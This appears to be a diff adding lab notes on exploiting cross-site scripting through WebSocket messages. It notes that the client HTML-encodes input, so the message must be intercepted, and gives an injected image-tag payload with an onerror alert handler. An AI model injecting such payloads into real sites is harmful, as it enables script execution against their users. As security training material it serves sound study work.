@@ -1,0 +1,5 @@
+// corresponding WebSocket message and observe that the < has been HTML-encoded by the client before sending. 
+// Can only inject the payload after intercepting to prevent HTML-encoding
+
+{"message":"<img src=1 onerror='alert(1)'>"}
+// Cannot using double quote around alert() due to the nature of websocket message
